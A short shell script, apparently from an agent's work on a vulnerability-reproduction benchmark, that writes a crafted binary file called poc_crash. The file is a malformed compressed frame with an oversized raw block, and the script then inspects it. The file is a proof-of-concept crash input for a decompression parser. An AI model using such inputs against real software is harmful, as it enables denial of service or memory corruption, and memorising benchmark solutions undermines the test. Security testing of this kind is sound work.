set -eu
printf '%s\n' 'Before recreation:'
ls -l /CybinGym_workdir/poc_crash /CybinGym_workdir/.analysis/v04_oversized_raw 2>&1 || true
artifact=/CybinGym_workdir/poc_crash
: > "$artifact"
printf '\x00\x00\x00\x00' >> "$artifact"
printf '\x24\xb5\x2f\xfd\x0f' >> "$artifact"
printf '\x07\xff\xff' >> "$artifact"
printf '\xf1\xff\x1f' >> "$artifact"
head -c 524284 /dev/zero >> "$artifact"
printf '\xc0\x00\x00' >> "$artifact"
chmod 0644 "$artifact"
test -f "$artifact"
test ! -L "$artifact"
stat -c 'path=%n type=%F mode=%a size=%s' "$artifact"
file "$artifact"
sha256sum "$artifact"
xxd -g1 -l 16 "$artifact"
xxd -g1 -s -8 "$artifact"
